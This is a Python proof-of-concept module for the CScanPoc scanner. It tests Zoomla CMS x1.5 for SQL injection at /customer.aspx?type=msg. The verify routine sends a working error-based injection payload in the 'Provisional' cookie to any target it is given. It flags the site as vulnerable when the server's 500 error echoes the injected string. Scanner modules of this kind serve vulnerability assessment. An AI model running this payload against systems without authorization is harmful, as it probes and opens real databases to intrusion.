# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'Zoomla_0001' # 平台漏洞编号，留空
    name = '逐浪CMS SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-08-06'  # 漏洞公布时间
    desc = '''
       逐浪CMS最新版x1.5 /customer.aspx?type=msg SQL注入漏洞。
    ''' # 漏洞描述
    ref = '' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=059965
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'Zoomla'  # 漏洞应用名称
    product_version = 'x1.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ac0bd01e-0a87-403d-943e-5cca62330fa2'
    author = '国光'  # POC编写者
    create_date = '2018-05-13' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/customer.aspx?type=msg"
            target = '{target}'.format(target=self.target)+payload
            cookie = "Provisional=Uid=convert(int,CHAR(104)+CHAR(101)+CHAR(110)+CHAR(116)+CHAR(97)+CHAR(105))"
            code, head, body, errcode, final_url = hh.http('-b "%s" "%s"' % (cookie, target))
                       
            if code == 500 and 'hentai' in body:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()